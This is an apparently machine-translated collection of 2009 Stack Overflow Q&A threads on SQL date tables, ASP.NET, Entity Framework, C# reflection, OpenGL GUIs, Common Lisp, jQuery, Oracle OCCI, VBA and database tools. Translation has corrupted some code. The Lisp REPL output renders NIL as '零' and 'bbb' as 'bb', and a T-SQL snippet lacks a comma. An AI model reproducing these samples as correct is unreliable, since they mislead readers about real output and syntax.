BEGIN

  INSERT INTO @DaysTable ( [Year], [Day] )
  SELECT DATEPART(YEAR, @StartDate), DATEPART(DAYOFYEAR, @StartDate)

  SELECT @StartDate = DATEADD(DAY, 1, @StartDate)
END

-- This gives me a table of all days since whenever
-- you could select @StartDate as the minimum date of your usage log)

SELECT days.Year, days.Day, events.NumEvents
FROM @DaysTable AS days
LEFT JOIN (
  SELECT
    COUNT(*) AS NumEvents
    DATEPART(YEAR, LogDate) AS [Year],
    DATEPART(DAYOFYEAR, LogDate) AS [Day]
  FROM LogData
  GROUP BY
    DATEPART(YEAR, LogDate),
    DATEPART(DAYOFYEAR, LogDate)
) AS events ON days.Year = events.Year AND days.Day = events.Day 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T14:53:52.960

创建一个内存表（一个表变量），您可以在其中插入日期范围，然后将登录表外部连接到它。按开始日期分组，然后您可以执行聚合和计算。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-06T14:54:34.987

我通常使用的策略是与查询相反的 UNION，通常是为不存在的行检索数据的查询。

如果我想获得一门课程的平均分，但有些课程没有被任何学生选修，我需要将那些没有被任何人选修的课程联合起来，为每节课显示一行：

```
SELECT AVG(mark), course FROM `marks` 
    UNION
SELECT NULL, course FROM courses WHERE course NOT IN
    (SELECT course FROM marks) 
```

您的查询将更复杂，但应适用相同的原则。您可能确实需要一个日期表来进行第二次查询

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-06T15:35:51.050

选项 1 您可以创建一个临时表并使用范围插入日期，并使用使用日志进行左外连接 选项 2 您可以在评估结果集以生成最终输出时以编程方式插入缺失的日期

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-06T14:53:20.527

```
WITH q(n) AS
          (
          SELECT  0
          UNION   ALL
          SELECT  n + 1
          FROM    q
          WHERE   n < 99
          ),
    qq(n) AS 
          (
          SELECT  0
          UNION   ALL
          SELECT  n + 1
          FROM    q
          WHERE   n < 99
          ),
    dates AS
          (
          SELECT  q.n * 100 + qq.n AS ndate
          FROM    q, qq
          )
SELECT    COUNT(userid) as numlogins,
          COUNT(DISTINCT userid) as numusers,
          CAST('2000-01-01' + ndate AS DATETIME) as date
FROM      dates
LEFT JOIN
          usagelog
ON        entryts >= CAST('2000-01-01' AS DATETIME) + ndate
          AND entryts < CAST('2000-01-01' AS DATETIME) + ndate + 1
GROUP BY
          ndate 
```

这将选择`10,000`即时构建的最新日期，这应该足够`30`多年了。

`SQL Server`每个有一个`100`递归限制`CTE`，这就是为什么内部查询可以返回`100`每个行。

如果您需要更多`10,000`，只需添加第三个`CTE` `qqq(n)`并在`dates`.

# asp.net-mvc - ASP.NET MVC：在 Firefox 3 中未提供参数时重定向回页面

> ID：721793
> 
> 赞同：0
> 
> 时间：2009-04-06T14:46:43.383
> 
> 标签：asp.net-mvc, firefox-3

我正在尝试做与此问题中详述的完全相同的事情：

[ASP.NET MVC：当没有为 URL 提供参数时重定向回页面](https://stackoverflow.com/questions/272454/asp-net-mvc-redirecting-back-to-page-when-no-parameter-is-given-to-url)

这是我的代码：

```
public ActionResult Details(long? id)
{
    if (!id.HasValue)
        return RedirectToAction("Index");

    Models.Track track = Models.Track.GetTrack(id.Value);
    if (track == null)
        return View("NotFound");
    else
        return View("Details", track);
} 
```

但是，当我打电话`RedirectToAction("Index")`并在 Firefox 3 中查看页面时，页面会挂起。它在 IE7 中重定向良好。

Firefox 3 中的 RedirectToAction 是否存在任何已知问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T14:52:09.440

试试这个。打开火狐。在地址栏中输入“about:config”。点击进入。接受警告。然后寻找：

network.dns.disableIPv6

通过双击该行将其设置为 true。立即试用您的网络应用程序。那样有用吗？

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2009-04-06T14:49:57.727

我不知道您的网址是如何配置的，但也许您处于递归循环中？你不断地重定向到同一个页面？

# c# - 实体框架：在业务层（对象）中创建自定义属性

> ID：721798
> 
> 赞同：1
> 
> 时间：2009-04-06T14:47:24.647
> 
> 标签：c#, entity-framework

使用实体框架创建 DataLayer (DataLayer.dll) DataLayer.dll 包含数据对象。我需要向“人”类添加一些业务逻辑。

是的，我知道，我可以使用部分类来添加业务逻辑。但在这种情况下（使用部分类），我们需要在 DataLayer.dll 中实现它！

我需要使用 BusinessLayer.dll

这样就创建了业务层（BusinesLayer.dll）

在 BusinesLayer.dll 我们有文件 myPerson.cs

```
using DataLayer;

namespace Businesslayer
{
public class myPerson : DataLayer.Person

public Property String FullName()
{
  get {return this.Firstname + " " + this.LastName}
}

} 
```

实际上我需要在网格中显示数据，像这样

```
 var data=context.Person;
 dataGridView1.dataSource = data; 
```

是的，context.Person 返回一个 Person-Objects 列表，因此在网格中，列“FullName”不可用

如何在 myPerson-Objects 上创建列表？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-07T00:45:30.667

First of all, if you're only creating FullName in order to display it in a grid, then I'd say it belongs in the UI layer, not the business layer.

Second, you don't need inheritance for this. You can use delegation. Give your UIPerson class an instance of Person in the constructor. Then, for each property of Person that you want to expose to the grid, do something like this:

```
public DateTime BirthDate
{
   get {return _person.BirthDate;}
   set {_person.BirthDate = value;}
} 
```

ReSharper can do this for you, or you can use some other tool or do it by hand. You then get to add your FullName property the same way.

# c# - 使用反射检查方法是否为“扩展方法”

> ID：721800
> 
> 赞同：17
> 
> 时间：2009-04-06T14:47:30.900
> 
> 标签：c#, reflection, extension-methods, methodinfo

作为我的应用程序的一部分，我有一个接收 MethodInfo 的函数，需要根据该方法是否为“扩展方法”对其进行特定操作。

我检查了 MethodInfo 类，但找不到任何显示该方法是扩展的*IsExtension属性或标志。*

有谁知道我如何从方法的 MethodInfo 中找到它？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-04-06T14:57:05.357

您可以在 MethodInfo 实例上调用**IsDefined方法，通过检查****ExtensionAttribute**是否应用于该方法来找出这一点：

```
bool isExtension=someMethod.IsDefined(typeof(ExtensionAttribute),true); 
```

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2009-04-06T14:51:57.723

基于

[C# 中的 F# 扩展方法](https://stackoverflow.com/questions/702256/f-extensions-in-c)

编译后的表单上似乎有一个属性。所以看看方法是否有这个属性：

[http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.extensionattribute.aspx](http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.extensionattribute.aspx)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-04-06T14:53:21.447

[这看起来与之前的问题](https://stackoverflow.com/questions/299515/c-reflection-to-identify-extension-methods)非常相似，可能值得一看。那里的建议是寻找具有[ExtensionAttribute](http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.extensionattribute.aspx)的类和方法，这听起来像你所追求的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-06T14:50:50.907

如果您知道您正在`MethodInfo`从实例中获取 a，则可以轻松检查该方法是否是静态的。扩展方法只是语法糖，并被转换为在实例中传递的静态方法调用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-06T14:51:04.667

编译器不会在编译时将所有扩展方法切换为静态方法调用吗？

```
myList.First(); 
```

变成

```
Enumerable.First(myList); 
```

如果是这种情况，那么 .net 运行时（您正在反射的地方）中没有扩展方法。

# c++ - 在桌面应用程序中使用 OpenGL 进行 GUI 设计有什么缺点？

> ID：721802
> 
> 赞同：19
> 
> 时间：2009-04-06T14:47:48.170
> 
> 标签：c++, user-interface, opengl

有大量用于 C/C++ 的 GUI 库，但其中很少有基于 opengl 是一个相当多平台的图形库的想法。使用这个 OpenGL 在便携式应用程序中构建我自己的最小 GUI 有什么大的缺点吗？

[Blender](http://www.blender.org)正在这样做，而且它似乎很适合它。

编辑：我的问题的重点不是使用外部库或自己制作。我主要关心的是使用使用 opengl 作为后端的库。[例如Agar](http://libagar.org)、 CEGUI 或 Blender 的 GUI。

谢谢。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-04-06T14:58:43.637

这是我从事的大型物理实验的一个奇怪的问题：因为 OpenGL GUI 绕过了一些常见的图形抽象层，它可能会击败远程查看应用程序。

在我想的特定情况下，我们希望允许通过 VNC 进行远程移位操作。除了一个使用 OpenGL 接口的程序（我们只需要大约每小时一次，但我们*确实需要）之外，一切都运行良好。*我们不得不延迟，直到可以准备好 OpenGL 接口的远程版本。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-04-06T15:27:59.633

您正在失去可访问性的本机平台功能。例如，在 Windows 上，大多数控件向屏幕阅读器或其他支持可访问性受损用户的工具提供信息。

基本上，除非您有真正的理由这样做，否则您不应该这样做。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-04-06T15:27:47.217

重新发明轮子：是的，你会这样做的。但我注意到 OP 在问题陈述中使用了“最小”这个词，所以假设它真的不需要扩大到所有这些，它可能是一个足够小的轮子，没关系。我目前工作的产品在三个平台（Win、Mac、Linux）上支持 OpenGL，我们构建了所有自己的小部件（文本框、按钮、对话框）。这是很多工作，但现在我们已经完成了它，我们拥有大量堆栈，并且当事情没有按预期工作时，不必调试到第三方框架。完全控制体验真是太好了。总有一些你想做但框架不支持的事情。就像我们业务中的所有事情一样，这是一种权衡，您只需权衡您的需求和按时完成的需求。

可移植性：是的，您仍然需要编写特定于平台的代码来引导所有内容。如果您以前没有这样做过，这将很困难，因为它需要您了解所有目标平台。

Windows 驱动程序：我们发现显卡制造商在 Windows 上对 DirectX 的支持比对 OpenGL 的支持要好得多，因为这是获得 MSFT 认证所必需的。中低档显卡通常在其 OpenGL 支持中存在错误、缺少功能或彻底崩溃。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-04-06T15:49:42.950

使用 Qt 4.5，您可以选择是否要将 OpenGL 用作窗口渲染器。

更多信息： [https ://www.qt.io/blog/2008/10/22/so-long-and-thanks-for-the-blit](https://www.qt.io/blog/2008/10/22/so-long-and-thanks-for-the-blit)

阅读评论以了解有关此问题的信息。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-06T14:49:55.793

显而易见的一点是，您基本上是在自己构建 GUI 元素，而不是像 wxWidgets 或 Qt 那样精心设计。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-04-06T15:04:50.343

你不能只使用opengl，你需要一个特定于平台的代码来为opengl设置一个窗口。来自免费提供的[opengl 红皮书](http://www.glprogramming.com/red/chapter01.html#name1)：

> OpenGL 被设计为一个流线型的、独立于硬件的接口，可以在许多不同的硬件平台上实现。为了实现这些品质，OpenGL 中不包含用于执行窗口任务或获取用户输入的命令；相反，您必须通过控制您正在使用的特定硬件的任何窗口系统工作。

有这方面的多平台解决方案，如 glut、qt、wxWidgets、...

如果您无论如何都必须使用它们，为什么不使用内置的 GUI 元素。它们还使您有机会构建自己的框架，并利用框架来处理鼠​​标/键盘事件等。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-04-06T14:55:42.457

如果你想要一个图形用户界面，如窗口/按钮等。不要自己做。有很多免费的解决方案，wxwidgets、qt 或 GTK。如果你想要一个 3d 窗口，都支持 OpenGL

# common-lisp - 在实践中，REMOVE 是否会返回相同的序列？

> ID：721803
> 
> 赞同：3
> 
> 时间：2009-04-06T14:47:54.333
> 
> 标签：common-lisp

在 Common Lisp 的任何实际实现中，[REMOVE](http://www.ai.mit.edu/projects/iiip/doc/CommonLISP/HyperSpec/Body/fun_removecm__elete-if-not.html)是否会返回相同的序列？该规范表明它是允许的：

> remove 的结果可能与序列共享；如果不需要删除任何元素，则结果可能与输入序列相同。

例如，SBCL 似乎没有这样做，但我只做了一个粗略的（可能不充分的）测试，我想知道其他实现是做什么的。

```
CL-USER> (defparameter *str* "bbb")
*STR*
CL-用户> *str*
“bb”
CL-USER> (defparameter *str2* (remove #\a *str*))
*STR2*
CL-USER> (eq *str* *str2*)
零
CL-用户> *str*
“bb”
CL-用户> *str2*
“bb”

```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-04-06T16:32:47.293

返回原始字符串可能很有用。如果没有删除字符串的任何元素，则返回原始序列会阻止分配新序列。即使内部分配了一个新序列，这个新序列也可以尽快变成垃圾。

例如，CLISP 返回原始字符串。

```
[1]> (let ((a "abc")) (eq a (remove #\d a)))

T 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T15:05:05.820

我怀疑这主要取决于实施。总的来说，我怀疑这并不常见，因为典型的情况是在调用 REMOVE 时删除了某些内容，因此对未删除的情况进行空间优化会导致运行时损失，并且不一定会节省任何空间，因为您想为字符串和数组的返回值分配空间，并且需要随时构建一个列表或执行两次操作。

# jquery - 使用 Firebug 调试 jQuery

> ID：721809
> 
> 赞同：21
> 
> 时间：2009-04-06T14:49:19.103
> 
> 标签：jquery

我已经看到了大量关于如何尝试在 Firebug 中调试 jQuery 的旧帖子。任何人都有一个好方法，但因为我根本没有看到一个有效的方法。

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2010-04-21T21:41:46.670

我认为提问者真的只是想知道如何在非常基本的水平上使用该工具，而且我想这些答案都没有直接针对他们的问题，这就是他们没有得到绿色检查的原因。尽管一旦您掌握了基础知识，其中的信息就会很有用。这个Q很老了，原作者可能已经赚了一百万美元，但也许这个答案会让别人受益。我自己知道的不多，但这是我所知道的。

您可以使用 firebug 窗口中的脚本选项卡。查看顶部，您会看到**console**、**html**、**css**、**script** **DOM**等选项卡。您想选择**脚本**标签，然后在不可能的小类型中，还有另一行选项卡，第一个默认为静态，第二个是所有具有 javascript 的组件的下拉列表。选择您要调试的那个并转到它的左侧，然后单击要设置断点的行旁边的空白处。那里仍然出现一个红色圆圈。现在在右边有箭头，用于进入、跨过等，在监视的右侧，您可以看到变量经过。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-04-06T15:07:57.827

首先，确保您没有使用 jQuery 的最小化或打包版本。这几乎是不可能调试的。接下来，我发现它有助于至少单步执行一次，以便您知道在 jQuery 代码中设置断点的位置。您可能还想断开代码中任何 jQuery 语句的链接，并将中间结果分配给您可以检查的变量。除此之外，我和@Chad 在一起。我在调试基于 jQuery 的代码时没有遇到很多问题。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-09-08T04:08:12.327

试试[这个插件](http://jasonkarns.com/blog/2009/01/06/announcing-jqueryfirebug/)。它专门用于在 Firebug 中调试基于 jquery 的 javascript。允许您进入链接事件并将它们记录到控制台。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T15:12:35.507

您可能还希望使用[jQuery 文档](http://docs.jquery.com/Main_Page)仔细检查您的大部分代码。jQuery 代码看起来非常熟悉，但有一些非常奇怪的编程范式，如果没有考虑到这些范式，就会产生有效的噪音。

# c++ - 什么是 OCCI 上下文和环境？

> ID：721810
> 
> 赞同：0
> 
> 时间：2009-04-06T14:49:28.807
> 
> 标签：c++, oracle, oracle-call-interface

我正在探索使用 Oracle API 的软件，据我所知，对象方法通常期望作为参数“OCCI 上下文”或“OCCI 环境”值。

一个示例是 Account 对象的构造函数：

```
Account( oracle::occi::Environment* env ); 
```

后来重载

```
Account( void* oraCtx ); 
```

我可以理解它们与某种“连接处理程序”有关，但我想知道更多。

我四处搜索，但找不到任何对我来说足够清楚的东西，似乎每个文档都是从您已经知道 Oracle API 的假设开始的。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T15:01:44.813

`OCCI Environment`让您定义自己的内存管理函数，这些函数`OCCI`将在以后使用。

当您创建一个`environment`时，您将指针传递给您自己的`malloc`，`realloc`并且`free`：

```
static Environment * createEnvironment(Mode mode = DEFAULT,
   void *ctxp = 0,
   void *(*malocfp)(void *ctxp, size_t size) = 0,
   void *(*ralocfp)(void *ctxp, void *memptr, size_t newsize) = 0,
   void (*mfreefp)(void *ctxp, void *memptr) = 0); 
```

`Context`只是一个指向在调用它们`Environment`时传递给这些函数的指针。`OCCI`

# vba - Excel VBA - 初始化空用户类型和检测空值

> ID：721811
> 
> 赞同：1
> 
> 时间：2009-04-06T14:49:29.930
> 
> 标签：vba, excel, initialization, user-defined-types

我创建了一个用户定义的类型来包含一些我将用来填充我的表单的数据。我正在使用该用户定义类型的数组，并在从异地服务器提取数据时调整该数组的大小。

为了让我的程序更容易消化，我开始把它拆分成子程序。但是，当我的程序被初始化时，我无法判断某个特定数组何时被初始化，因此我无法确定是否可以调用 size 函数来查看数组是否为空。

有没有办法初始化空用户类型或检测空用户类型？目前，我正在对其进行硬编码，我更喜欢更优雅的解决方案。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-04-06T15:23:58.677

除了 isempty(array) 解决方案 -

```
If IsNull(array) then 

   msgbox "array is empty"

End If 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T16:03:08.817

AFAIK，您无法检查用户定义类型在作为参数发送给过程/函数之前是否已初始化。

我从 VBA 帮助中引用了这个例子

```
 Type StateData
    CityCode(1 To 100) As Integer     ' Declare a static array.
    County As String * 30
End Type 

```

County 字段被初始化为某个值，您可以使用该值作为基值。如果用户明确设置此字段，则意味着它拥有一些值并保持未初始化，否则。

例如

```
Sub main()
    Dim example As StateData
    MsgBox IsInitialized(example)

    Dim example2 As StateData
    example2.County = "LA"
    MsgBox IsInitialized(example2)
End Sub
Function IsInitialized(arg As StateData) As Boolean
    Dim initCounty As String * 30
    IsInitialized = (arg.County <> initCounty)
End Function 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T15:05:07.847

尝试：

```
dim v

if isempty(v) then
    msgbox "is empty"
end if 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T14:53:09.747

```
If myObjectVariable is Nothing 
```

应该可以检测对象是否已初始化。

编辑：“什么都不是”确实有效，如果它是一个*对象*变量：

```
Dim blah As Object
If blah Is Nothing Then
    MsgBox "blah is nothing!"
End If

Dim foo as variant
If IsEmpty(foo) Then
    MsgBox "foo is empty!"
End If 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-03-06T17:08:26.763

如果您需要检查自定义类型的整个动态数组是否已在 VBA 中初始化（不仅仅是特定元素），那么这可能无法直接进行（因为 IsEmpty 等函数均不适用于自定义类型）。但是，您可能能够轻松地重组程序以返回大小为 0 的自定义类型的数组，以指示没有读取/初始化任何内容。

```
Private Function doStuff() As customType()
    Dim result() As customType

    ' immediately size it to 0 and assing it as result
    ReDim result(0)
    doStuff = vysledek

    ' do real stuff, ... premature "Exit Function" will return an array of size 0
    ' possibly return initialized values
End Function

' then you can all
If (UBound(tabulky) = 0) Then
    MsgBox "Nope, it is not initialized."
End If 
```

# asp.net - 以编程方式设置母版页的母版页

> ID：721814
> 
> 赞同：2
> 
> 时间：2009-04-06T14:49:37.557
> 
> 标签：asp.net

无论如何以编程方式设置母版页的母版页？我需要在每一页上都这样做吗？我无权访问 Master 的 pre_init 事件。嗯...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-06T14:53:28.827

```
void Page_PreInit(Object sender, EventArgs e)
{
    this.MasterPageFile = "~/NewMaster.master";
} 
```

[以编程方式使用 ASP.NET 母版页](http://msdn.microsoft.com/en-us/library/c8y19k6h.aspx)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-04-06T14:54:11.853

在 PreInit 函数的地方：

```
this.MasterPageFile = "~/masterPage.master"; 
```

是的，您需要将其放在每一页上。为了解决这个问题，让所有页面都从基本页面继承，并将母版页引用放在那里。

# windows - 开发打印驱动程序

> ID：721825
> 
> 赞同：3
> 
> 时间：2009-04-06T14:51:20.330
> 
> 标签：windows, sdk

我需要开发一个打印驱动程序来从任何应用程序打印到 TIFF 文件中。有人知道可以让我这样做的资源或优秀的 SDK 供应商吗？环境是Windows，任何语言。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T14:55:24.563

[Microsoft Windows Driver Kit](http://www.microsoft.com/whdc/devtools/WDK/default.mspx)（可从链接的 Microsoft 站点免费获得）包含有关编写打印机驱动程序的大量文档和示例。您可以在下载之前查看 DDK 文档的在线[打印机驱动程序页面。](http://msdn.microsoft.com/en-us/library/bb870492.aspx)

编辑：一种可能会更快部署的商业替代方案是[VeryPDF 的 DocumentPrinter](http://www.verypdf.com/artprint/)。它相当昂贵（目前开发人员许可证为 1500 美元，服务器许可证为 399 美元），但据我所知，他们的支持相当不错，所以如果价格对你来说是可行的，这可能是一个不错的选择。

还有[一个来自 DirectConvert 的 SDK](http://www.directconvert.com/us/printer/printer_driver/directcontrol.htm)，但我找不到任何定价信息并且对它们一无所知。

根据您的使用模式，另一种选择是[TechSmith SnagIt](http://www.techsmith.com/screen-capture.asp)之类的，它具有可用的打印机捕获功能。不过，这不是 SDK。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2011-07-20T21:01:40.590

使用 Windows DDK 创建光栅打印驱动程序。他们提供的样品就可以了。这将生成位图，然后可以使用[LibTiff](http://www.libtiff.org/)将其转换为 TIFF 。您的 OEMsendPage 函数是将位图转换为 TIFF 并保存的地方。如果您不熟悉 DDK 和 Windows 打印驱动程序，预计会在此花费相当多的时间。

我有一个我曾经销售过的驱动程序的源代码，它完全符合您的要求，但我在 NT 4 之后停止维护它，所以它已经严重过时，需要做一些重要的工作才能使其在现代 Windows 平台上有用。

# sql - T-SQL 中的并发查询

> ID：721828
> 
> 赞同：1
> 
> 时间：2009-04-06T14:52:01.547
> 
> 标签：sql, sql-server

我有一个很长的存储过程，它会进行大量查询并生成报告。由于它是一份摘要报告，它会调用许多其他过程来获取数据。我想知道是否可以使用 Sql server 中的 proc 执行并发 sql 批处理...

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T20:11:47.237

不，SQL Server 不执行我认为您的意思的并发。

代码运行多长时间？是不是有问题？

编辑，根据评论。

11-20 秒的大型总结报告一点也不差。

如果您从客户端并行提交调用，则可能需要相同或更长的时间：如果每个查询都相当密集并且资源繁重，那么您可能会通过一起运行它们来最大化服务器并影响其他进程。+ 然后您必须在客户端中以最终形式组装数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-07T04:05:37.330

你最好的办法是从另一个数据库报告这样的东西。基于从生产数据库到 OLAP 数据库的转换（这将使时间延迟消失），或者至少是一个定期（例如，几乎是）静态快照（这将使延迟无关紧要 - 您可以关闭锁定，因为什么都不会改变）。

附带好处：报告读者会更高兴看到报告间隔五分钟，给出相同的答案。或者相隔12小时。

您最欣赏的好处是生活会更简单。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T19:12:05.867

我认为您必须在代码中进行并发（多线程 sql 调用）并在最后连接结果。

# mysql - 直接访问数据库的开发人员工具

> ID：721852
> 
> 赞同：15
> 
> 时间：2009-04-06T14:57:35.353
> 
> 标签：mysql, sql-server, database, eclipse, oracle

我使用几个不同的数据库，发现自己经常尝试连接到这些数据库来测试查询。我使用数据库特定工具连接到数据库并运行查询。

我发现这些特定于数据库的工具，如 SQL 查询分析器 (SQL-Server)、Oracle 企业管理器、MySQL 查询浏览器，在运行快速查询和直接查看数据时非常笨拙和缓慢。也很难记住开发和测试数据库的所有用户 ID 和密码。

作为开发人员，您使用哪些工具连接到所选数据库？我使用 Eclipse 作为 IDE。所以任何 Eclipse 特定的技巧也值得赞赏。

即使一个工具与一个数据库一起工作，而不是与另一个数据库一起工作，如果它比数据库供应商提供的更用户友好，我也愿意研究它。我已经在使用 3 个不同的了。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-04-06T15:03:20.690

[SQuirreL](http://squirrel-sql.sourceforge.net/)是用 java 编写的，可以与任何有 JDBC 驱动程序的 RDBMS 一起使用。

它对于发送 SQL、呈现结果集和允许浏览数据库对象（从树）都非常有效。对于几个 RDBMS，它包括自动生成通用语句的扩展。

特别好的是查询窗格执行选定的 sql 或光标所在的行，直到第一个空行。这允许您编写多个语句，并单独或批量执行它们。

它是免费和开源的。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-04-06T15:10:21.347

我用过不少。

*   [PL/SQL Developer](http://www.allroundautomations.com/plsqldev.html)：顾名思义，这是特定于 Oracle 的，但它是迄今为止我最喜欢的 DB 工具。它大大简化了导入/导出；
*   [Toad](http://www.toadsoft.com/)：也是 Oracle 特有的。我曾经是这个的忠实粉丝，但它很贵，而且我认为这些天更面向 DBA。对于开发人员来说，我认为它提供的东西（考虑到价格差异）并没有超过 PL/SQL Developer；
*   [DBVisualizer](http://www.minq.se/products/dbvis/)：这个工具还不错。我不确定商业版本是否值得他们要求的价格。免费版还可以。它可以与几乎任何数据库一起使用，这很好。
*   [Navicat for MySQL](http://www.navicat.com/)：没关系，但老实说我不会为此付费；
*   [SQL Server 管理工作室](http://www.microsoft.com/downloads/details.aspx?familyid=C243A5AE-4BD1-4E3D-94B8-5A0F62BF7796&displaylang=en)：附带 SQL Server。我认为对于 SQL Server，我真的不需要比这更多的东西，除了可能是一种更好的导入/导出数据库的方法，这对它来说是垃圾；
*   [Oracle SQL Developer](http://www.oracle.com/technology/products/database/sql_developer/index.html)：当您别无选择时，这是您在 Linux 上使用的穷人工具。这是相当基本的，但可以，因为它是免费的。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-04-06T15:17:23.200

[AquaDataStudio](http://www.aquafold.com/)也是一个不错的工具

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-04-06T15:02:36.387

我用过：

[蟾蜍](http://www.toadsoft.com/)

[DBVisualizer](http://www.minq.se/products/dbvis/)

我更喜欢 DBVisualizer，但它有点占用内存，所以如果您的资源有问题，它可能不是正确的解决方案。

我也尝试过eclipse插件。对我来说，我宁愿优化 eclipse 来完成它应该做的工作。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-04-13T12:55:53.690

当涉及到这样的东西时，我更喜欢便携式工具。安装一次，您可以将它们放在闪存或 CD 上并随身携带。连接到数据库应该像填写常用字段一样简单：服务器、用户、密码。

[Sql Buddy](http://sqlbuddy.sourceforge.net/) 体面的一个，开源，具有语法高亮和代码完成。最近没有更新，但通常可以正常工作。

[GiPo@DB Utilities](http://www.gibinsoft.net/gipoutils/dbutil/content.htm) 非常不错的一款，具有上述所有功能，以及之前商业化的更多功能。

提到的工具大小不超过几 MB，安装它们并将它们复制到您的便携式位置需要 1 分钟。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-07-02T08:30:36.610

在 Eclipse 中，您可以使用[Eclipse Data Tools Platform](http://www.iipt.fr/dtptutor.html)进行数据库开发。在最近的版本中，您还可以找到某种[可视化查询构建器](http://live.eclipse.org/node/678)。Oracle 有一个[DTP 插件](http://download.oracle.com/docs/cd/E14545_01/help/oracle.eclipse.tools.database.doc/html/gettingStarted/files/gettingStarted.html)并实现了一些 Oracle 特定的功能。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-04-13T12:48:34.503

Database Workbench 可用于 Oracle - SQL Server 和 MySQL

[http://www.upscene.com](http://www.upscene.com)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-04-06T15:02:19.210

看看[快速 SQL](http://edn.embarcadero.com/rapid_sql)

它是一个跨平台的 SQL IDE，可帮助数据库和应用程序开发人员更快地生成高质量的 SQL 代码。Embarcadero Rapid SQL 通过以下方式帮助您提高数据库开发效率：

简化 SQL 编码任务、对象管理、逆向工程、源代码控制和模式部署

改善团队协作和资源共享

通过代码辅助、快速修复、SQL 到 Java 往返调试和分析工具加快应用程序开发周期

使用具有深度跨 DBMS 平台支持的一套工具进行标准化

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-07-02T08:43:54.617

[Aqua Data Studio](http://www.aquafold.com/)和[RapidSQL](http://www.embarcadero.com/products/rapid_sql/index.php)是用于 sql 开发的两个很棒的工具/IDE。您可以连接几乎任何数据库引擎，它们包括一些供应商特定的功能，例如 Oracle 等。

此外，由于您使用 Eclipse IDE，您可以考虑使用 Eclipse Data Tools Platform 或 QuantumDB 插件。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-07-02T13:32:01.400

这些工具取决于要做的工作。对于大多数浏览我选择[DbVisualizer](http://dbvis.com)，我可以完全根据我的需要自定义它。支持很好，反应灵敏。对于 pl/sql 编辑，我更喜欢 oracle sqldeveloper。DbVisualizer 不是免费工具，但价格公道，与 Toad 相比甚至可能更便宜。它也是多数据库，但它的实现方式使我不受 Oracle 世界的限制，它可以帮助我在我不太了解的其他供应商 rdbms 上导航。对于实时监控，DbVisualizer 有一个非常好的选项，我在任何其他应用程序中都没有见过。如果您尝试调试一些（例如，性能问题），则非常有用。

[罗纳德](http://ronr.blogspot.com)

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-12-16T14:54:12.990

查看[RazorSQL](http://www.razorsql.com/)。它具有最昂贵工具的所有功能，而价格只是其中的一小部分。

# c# - 如何使用 RenderControl 注册回发事件？

> ID：721854
> 
> 赞同：2
> 
> 时间：2009-04-06T14:58:31.140
> 
> 标签：c#, asp.net, event-handling

我在字符串生成器中使用 RenderControl 在 asp:TreeView 中添加下拉列表。我的下拉列表设置为自动回发，并且我在附加的 SelectedIndexChanged 上有一个事件。不幸的是，我看到我的下拉列表正确填充在我的树视图中，但更改选择不会引发事件。

这是我的代码：

```
DropDownList ddlTest = new DropDownList();
ddlTest.Items.Add("test");
ddlTest.Items.Add("test2");
ddlTest.AutoPostBack = true;
ddlTest.SelectedIndexChanged += ddlTest_SelectedIndexChanged;

TreeNode node = new TreeNode();

StringBuilder sb = new StringBuilder();
StringWriter sw = new StringWriter(sb);
HtmlTextWriter writer = new HtmlTextWriter(sw);

ddlTest.RenderControl(writer);

node.Text = sb.ToString();
node.ShowCheckBox = false; 
```

在下拉列表或类似的东西上没有注册事件的方法。有什么办法可以实现我想要做的事情吗？

* * *

